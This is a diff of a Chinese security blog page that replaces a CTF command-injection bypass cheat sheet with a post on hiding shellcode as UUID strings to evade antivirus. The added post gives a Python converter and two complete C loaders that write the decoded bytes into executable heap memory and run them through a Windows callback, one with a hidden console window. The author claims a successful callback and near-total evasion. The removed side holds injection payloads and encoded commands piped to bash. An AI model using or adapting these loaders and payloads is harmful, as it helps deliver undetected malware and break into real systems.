@@ -19,21 +19,25 @@
   <meta http-equiv="window-target" content="_top">
   
   
-  <title>RCE远程命令执行绕过 | Shym&#39;s Blog</title>
-  <meta name="description" content="做ctfhub后小总结，以及参考 空格过滤空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过 1234567cat&amp;lt;flag //重定向符cat&amp;lt;&amp;gt;flag //重定向符cat$&amp;#123;IFS&amp;#125;flag //IFS可能也过滤了&amp;#123;&amp;#125;，用$IFS$1代替：?ip=127.0.0.1;cat$IFS$1index.php">
-<meta name="keywords" content="CTFhub-RCE">
+  <title>uuidshellcode免杀 | Shym&#39;s Blog</title>
+  <meta name="description" content="关于通过将shellcode转化为uuid，并把uuid解释并写入内存空间执行 原文：https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/ 我们可以通过编写python脚本来进行shellcode转换uuid，我使用如下代码 12345678910111213141">
+<meta name="keywords" content="uuidshellcode">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RCE远程命令执行绕过">
-<meta property="og:url" content="https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/index.html">
+<meta property="og:title" content="uuidshellcode免杀">
+<meta property="og:url" content="https:///login546.github.io/2021/01/27/uuidshellcode免杀/index.html">
 <meta property="og:site_name" content="shym&#39;s blog">
-<meta property="og:description" content="做ctfhub后小总结，以及参考 空格过滤空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过 1234567cat&amp;lt;flag //重定向符cat&amp;lt;&amp;gt;flag //重定向符cat$&amp;#123;IFS&amp;#125;flag //IFS可能也过滤了&amp;#123;&amp;#125;，用$IFS$1代替：?ip=127.0.0.1;cat$IFS$1index.php">
+<meta property="og:description" content="关于通过将shellcode转化为uuid，并把uuid解释并写入内存空间执行 原文：https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/ 我们可以通过编写python脚本来进行shellcode转换uuid，我使用如下代码 12345678910111213141">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/105930649-e6db1880-6084-11eb-8445-e7fe8e5d5a2c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/105930989-636df700-6085-11eb-8439-1d43eb8fb2d0.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/105931065-7d0f3e80-6085-11eb-8e30-e346bb011823.png">
 <meta property="og:updated_time" content="2021-02-21T06:21:49.994Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="RCE远程命令执行绕过">
-<meta name="twitter:description" content="做ctfhub后小总结，以及参考 空格过滤空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过 1234567cat&amp;lt;flag //重定向符cat&amp;lt;&amp;gt;flag //重定向符cat$&amp;#123;IFS&amp;#125;flag //IFS可能也过滤了&amp;#123;&amp;#125;，用$IFS$1代替：?ip=127.0.0.1;cat$IFS$1index.php">
+<meta name="twitter:title" content="uuidshellcode免杀">
+<meta name="twitter:description" content="关于通过将shellcode转化为uuid，并把uuid解释并写入内存空间执行 原文：https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/ 我们可以通过编写python脚本来进行shellcode转换uuid，我使用如下代码 12345678910111213141">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/38073810/105930649-e6db1880-6084-11eb-8445-e7fe8e5d5a2c.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/index.html">
+  <link rel="canonical" href="https:///login546.github.io/2021/01/27/uuidshellcode免杀/index.html">
   
     <link rel="alternate" href="/atom.xml" title="shym&#39;s blog" type="application/atom+xml">
   
@@ -334,21 +338,21 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#空格过滤"><span class="toc-number">1.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令分隔符"><span class="toc-number">2.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#敏感字符过滤绕过"><span class="toc-number">3.</span> <span class="toc-text">敏感字符过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-number">3.1.</span> <span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base"><span class="toc-number">3.1.1.</span> <span class="toc-text">base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hex"><span class="toc-number">3.1.2.</span> <span class="toc-text">hex</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oct-八进制"><span class="toc-number">3.1.3.</span> <span class="toc-text">oct(八进制)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#连字符绕过"><span class="toc-number">3.2.</span> <span class="toc-text">连字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量绕过"><span class="toc-number">3.3.</span> <span class="toc-text">变量绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反斜杠绕过"><span class="toc-number">3.4.</span> <span class="toc-text">反斜杠绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ip进制转换绕过"><span class="toc-number">3.5.</span> <span class="toc-text">ip进制转换绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显创建文件绕过"><span class="toc-number">4.</span> <span class="toc-text">无回显创建文件绕过</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#关于"><span class="toc-number">1.</span> <span class="toc-text">关于</span></a></li></ol>
     </nav>
   </div>
 </aside>
 
 <main class="main" role="main">
   <div class="content">
-  <article id="post-RCE远程命令执行绕过" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-uuidshellcode免杀" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      RCE远程命令执行绕过
+      uuidshellcode免杀
     </h1>
   
 
@@ -356,20 +360,20 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/03/17/RCE远程命令执行绕过/" class="article-date">
-	  <time datetime="2020-03-17T17:01:45.000Z" itemprop="datePublished">2020-03-17</time>
+	<a href="/2021/01/27/uuidshellcode免杀/" class="article-date">
+	  <time datetime="2021-01-27T09:29:00.000Z" itemprop="datePublished">2021-01-27</time>
 	</a>
 </span>
         
   <span class="article-category">
     <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/Bypass/">Bypass</a>
+    <a class="article-category-link" href="/categories/免杀/">免杀</a>
   </span>
 
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link" href="/tags/CTFhub-RCE/">CTFhub-RCE</a>
+	<a class="article-tag-link" href="/tags/uuidshellcode/">uuidshellcode</a>
   </span>
 
 
@@ -382,34 +386,36 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/03/17/RCE远程命令执行绕过/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/27/uuidshellcode免杀/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 674(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 619(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 2(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 3(分)</span>
 	
 
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>做ctfhub后小总结，以及参考</p>
-<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag //重定向符</span><br><span class="line">cat&lt;&gt;flag //重定向符</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag //IFS</span><br><span class="line">可能也过滤了&#123;&#125;，用<span class="variable">$IFS</span><span class="variable">$1</span>代替：</span><br><span class="line">?ip=127.0.0.1;cat<span class="variable">$IFS</span><span class="variable">$1index</span>.php</span><br><span class="line">cat%09flag //其他字符代替</span><br><span class="line">&#123;cat,flag&#125; //&#123;,&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line"></span><br><span class="line">windows中：%0a、&amp;、|、%1a（.bat文件中的命令分隔符）</span><br><span class="line"></span><br><span class="line">;： 在 shell 中，担任”连续指令”功能的符号就是”分号”。命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。</span><br><span class="line"></span><br><span class="line">&amp;：简单拼接 无制约</span><br><span class="line"></span><br><span class="line">&amp;&amp;：前面执行成功后面才会执行</span><br><span class="line"></span><br><span class="line">|：符号 左边输出 作为右边输入，所以左边的输出并不显示。当第一条命令失败时，它仍然会执行第二条命令</span><br><span class="line"></span><br><span class="line">||：前面执行失败才会执行后面</span><br></pre></td></tr></table></figure>
-<h2 id="敏感字符过滤绕过"><a href="#敏感字符过滤绕过" class="headerlink" title="敏感字符过滤绕过"></a>敏感字符过滤绕过</h2><p>过滤ls、cat、flag等</p>
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base"><a href="#base" class="headerlink" title="base"></a>base</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">echo</span> <span class="string">'cat'</span> | base64</span><br><span class="line">Y2F0Cg==</span><br><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% `<span class="built_in">echo</span> <span class="string">'Y2F0Cg=='</span> | base64 -d` flag.txt</span><br><span class="line">flag&#123;sadas_sadsad_sadasdad-sdsad&#125;</span><br><span class="line">[shymdembp:~]</span><br></pre></td></tr></table></figure>
-<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">echo</span> <span class="string">"63617420666C61672E747874"</span> | xxd -r -p|bash</span><br><span class="line">flag&#123;sadas_sadsad_sadasdad-sdsad&#125;</span><br><span class="line">[shymdembp:~]</span><br><span class="line">[shym]%</span><br></pre></td></tr></table></figure>
-<h4 id="oct-八进制"><a href="#oct-八进制" class="headerlink" title="oct(八进制)"></a>oct(八进制)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">printf</span> <span class="string">"\154\163"</span></span><br><span class="line">ls%                                                                             [shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span></span><br><span class="line">cat /flag%</span><br></pre></td></tr></table></figure>
-<h3 id="连字符绕过"><a href="#连字符绕过" class="headerlink" title="连字符绕过"></a>连字符绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% ca<span class="string">''</span>t flag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% ca<span class="string">''</span>t fl<span class="string">''</span>ag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% c<span class="string">''</span>at fla<span class="string">''</span>g</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="变量绕过"><a href="#变量绕过" class="headerlink" title="变量绕过"></a>变量绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br></pre></td></tr></table></figure>
-<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shym]% ca\t fl\ag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% c\at f\lag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="ip进制转换绕过"><a href="#ip进制转换绕过" class="headerlink" title="ip进制转换绕过"></a>ip进制转换绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//ip地址过滤可将ip地址转化为数字ip地址</span><br><span class="line"></span><br><span class="line">IP地址用“点分十进制”表示，用“.”分成4部分；数字地址是一串用“十进制”表示的数字。</span><br><span class="line">　 比如：百度的IP地址“39.156.69.79”转换成数字地址就是“664552783”。在浏览器中输入664552783就可以访问百度网站</span><br><span class="line">转化网址：http://www.msxindl.com/tools/ip/ip_num.asp</span><br></pre></td></tr></table></figure>
-<h2 id="无回显创建文件绕过"><a href="#无回显创建文件绕过" class="headerlink" title="无回显创建文件绕过"></a>无回显创建文件绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下用	1&gt;1 可创建文件名为1的空文件。</span><br><span class="line">					a&gt;1 虽报错，但可以创建空文件。</span><br><span class="line">					ls&gt;1 把ls的内容导入1中</span><br></pre></td></tr></table></figure>
-<p>在做这类题目时，一部分会给出源代码，我们可以直接参考源代码进行选择绕过让法。</p>
-<p>如果没有，我们需要去猜测后台语句如何构造的，过滤了哪些，还有哪些可以用，然后结合各种绕过方式构造payload。</p>
+        <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>通过将shellcode转化为uuid，并把uuid解释并写入内存空间执行</p>
+<p>原文：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p>
+<p>我们可以通过编写python脚本来进行shellcode转换uuid，我使用如下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">u=[<span class="string">"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51"</span>,</span><br><span class="line"><span class="string">"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"</span>,</span><br><span class="line"><span class="string">"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\x00\x00\x00"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;len(u):</span><br><span class="line">    print(uuid.UUID(bytes_le=u[i]))</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以上shellcode处为演示无实际意义，请自行更换</span></span><br></pre></td></tr></table></figure>
+<p>在shellcode最后一行中我们通过填充x00\x00\x00来占位防止程序报错</p>
+<p>之后我们通过文中给的解释器来进行编译,将以上脚本生成的uuid替换到下面的uuids处</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Rpcrt4.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"6850c031-6163-636c-5459-504092741551"</span>,</span><br><span class="line">    <span class="string">"2f728b64-768b-8b0c-760c-ad8b308b7e18"</span>,</span><br><span class="line">    <span class="string">"1aeb50b2-60b2-2948-d465-488b32488b76"</span>,</span><br><span class="line">    <span class="string">"768b4818-4810-48ad-8b30-488b7e300357"</span>,</span><br><span class="line">    <span class="string">"175c8b3c-8b28-1f74-2048-01fe8b541f24"</span>,</span><br><span class="line">    <span class="string">"172cb70f-528d-ad02-813c-0757696e4575"</span>,</span><br><span class="line">    <span class="string">"1f748bef-481c-fe01-8b34-ae4801f799ff"</span>,</span><br><span class="line">    <span class="string">"000000d7-0000-0000-0000-000000000000"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);</span><br><span class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);</span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"UuidFromStringA() != S_OK\n"</span>);</span><br><span class="line">            CloseHandle(ha);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         hptr += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Hexdump: "</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems*<span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02X "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)ha)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);</span><br><span class="line">    CloseHandle(ha);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译生成exe</p>
+<p><img src="https://user-images.githubusercontent.com/38073810/105930649-e6db1880-6084-11eb-8445-e7fe8e5d5a2c.png" alt="image"></p>
+<p>运行成功上线</p>
+<p><img src="https://user-images.githubusercontent.com/38073810/105930989-636df700-6085-11eb-8439-1d43eb8fb2d0.png" alt="image"></p>
+<p>免杀测试</p>
+<p><img src="https://user-images.githubusercontent.com/38073810/105931065-7d0f3e80-6085-11eb-8e30-e346bb011823.png" alt="image"></p>
+<p>成功绕过国内所有杀软，以及国外大部分杀软，仅2项爆红。</p>
+<p>不得不说，uuidshellcode免杀效果真心不错。</p>
+<p>另贴一个隐藏cmd窗口的版本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;heapapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment( linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span> )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Rpcrt4.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"e48348fc-e8f0-00c8-0000-415141505251"</span>,</span><br><span class="line">    <span class="string">"d2314856-4865-528b-6048-8b5218488b52"</span>,</span><br><span class="line">    <span class="string">"728b4820-4850-b70f-4a4a-4d31c94831c0"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//在进程的虚拟地址空间中保留空间</span></span><br><span class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//申请内存</span></span><br><span class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//UUID转换为原来的shellcode写入内存</span></span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"UuidFromStringA() != S_OK\n"</span>);</span><br><span class="line">            CloseHandle(ha);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hptr += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Hexdump: "</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems * <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02X "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)ha)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//枚举操作系统上安装或支持的语言环境。</span></span><br><span class="line">    CloseHandle(ha);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -419,7 +425,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/" title="RCE远程命令执行绕过" target="_blank" rel="external">https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/</a>
+      <a href="https:///login546.github.io/2021/01/27/uuidshellcode免杀/" title="uuidshellcode免杀" target="_blank" rel="external">https:///login546.github.io/2021/01/27/uuidshellcode免杀/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -465,13 +471,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2020/04/01/CVE-2020-0796复现/" title="CVE-2020-0796复现"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2020/03/04/CTFhub注入题目/" title="CTFhub注入题目"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/04/01/CVE-2020-0796复现/" title="CVE-2020-0796复现"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
